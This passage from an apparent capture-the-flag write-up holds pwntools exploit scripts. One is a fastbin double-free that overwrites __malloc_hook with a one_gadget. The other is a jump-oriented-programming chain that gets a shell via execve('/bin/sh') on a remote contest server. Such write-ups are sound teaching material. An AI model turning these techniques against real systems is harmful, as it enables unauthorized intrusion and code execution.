libc_base = u64(link.recv(6).ljust(8, b'\x00'))-0x3c4b78
print(hex(libc_base))
edit(p64(0)+p64(0x90))

add(0x70)  # 6从unsortedbin

add(0x60)  # 7
add(0x60)  # 8
delete(7)
delete(8)
delete(7)
add(0x60, p64(libc_base+libc.sym['__malloc_hook']-0x23))  # 9
add(0x60)
add(0x60)
add(0x60, b'a'*0x13+p64(libc_base+ogg[2]))

link.sendlineafter(b'> ', b'1')
link.sendlineafter(b'size?\n>', b'32')

link.interactive()

```

### noret
很简洁，没有 ret ，考虑 jop

思路：把 rcx 和 rdx 覆盖成“ret”（`add rsp,8;jmp rsp-8;`），动调下去看

选项 4 可以把返回地址泄露出来

exp：

```python
#!/usr/bin/env python3

from pwn import*
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
# link=process("./noret")
link=remote("node1.tgctf.woooo.tech",32470)
# elf=ELF('./noret')

link.recvuntil(b"> ")
link.send(b'4')
retaddr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(retaddr))

xor_rax=0x40100A
pop_rsp=0x40100f
pop_rcx=0x401016
add_rax_rdx=0x401024
syscall=0x40113D
ret=0x40113F

link.recvuntil(b"> ")
link.send(b'2')
link.recvuntil(b"Submit your feedback: ")

payload=p64(retaddr-0x21)+p64(retaddr-0x18)+p64(retaddr-0x1d-0x28)+p64(add_rax_rdx)+p64(xor_rax)+p64(0x40101B)+p64(pop_rcx)+p64(retaddr-0x1d-0x28)+p64(0x401021)+p64(59)+p64(0x401024)+p64(0x401021)+p64(0)+p64(syscall)+(0xbb-8*14)*b'a'+p64(ret)+0xd*b'a'+p64(0x401000)+b'/bin/sh\x00'+p64(ret)+p64(0x401000)+p64(0)+p64(0)+p64(pop_rsp)+p64(retaddr-0x100)
link.send(payload)

link.interactive()
```

